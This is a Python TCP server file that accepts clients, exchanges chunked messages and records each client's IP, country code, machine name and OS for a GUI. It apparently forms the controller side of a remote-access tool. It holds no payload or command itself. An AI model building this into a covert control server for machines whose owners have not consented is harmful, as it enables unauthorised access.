import socket
import threading
import config
from gui import start as start_gui


class Server:
    def __init__(self, ip, port):
        """
        Initiates the server
        :param ip: ip address to host the server on
        :param port: port to listen for connections on
        """
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((ip, port))
        self.server_socket.listen()
        print('Listening for clients...')
        self.client_sockets = []
        self.messages = []

    def close(self):
        """ Closes the server """
        self.server_socket.close()

    def send(self, sock, message):
        """
        Sends a message in small chunks to the client
        :param sock: Client socket object
        :param message: Message to send to the server (bytes/str)
        """
        message = message.encode() if type(message) != bytes else message
        if len(message) % config.BUFFER_SIZE == 0:
            message = message + '.'.encode()
        while message:
            sock.send(message[:config.BUFFER_SIZE])
            message = message[config.BUFFER_SIZE:]

    def receive(self, sock, as_bytes=False):
        """
        Recieve a message in small chunks from the client
        :param sock: Client socket object
        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
        """
        chunk = sock.recv(config.BUFFER_SIZE)
        data = chunk
        while len(chunk) == config.BUFFER_SIZE:
            chunk = sock.recv(config.BUFFER_SIZE)
            if chunk != '.'.encode():
                data += chunk
        return data if as_bytes else data.decode(errors="ignore")


def client_connections(server):
    """
    Handles new connections and adds them to the client list.
    :param server: Server socket object
    """
    try:
        while True:
            (client_socket, addr) = server.server_socket.accept()
            print('\n[+] New connection from: ', addr[0])
            client_data = server.receive(client_socket).split(',')  # IP,CountryCode,Name,Os
            print({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
            # Add new client to the clients list
            exist = False
            for client in config.client_list:
                if client['ip'] == addr[0]:
                    exist = True
                    break
            if not exist:
                config.client_list.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
    except socket.error as e:
        print(e)
        client_connections(server)


def main():
    server = Server('localhost', 8000)
    threading.Thread(target=client_connections, args=(server,)).start()  # Thread to accept new connections
    start_gui(server)


if __name__ == "__main__":
    main()
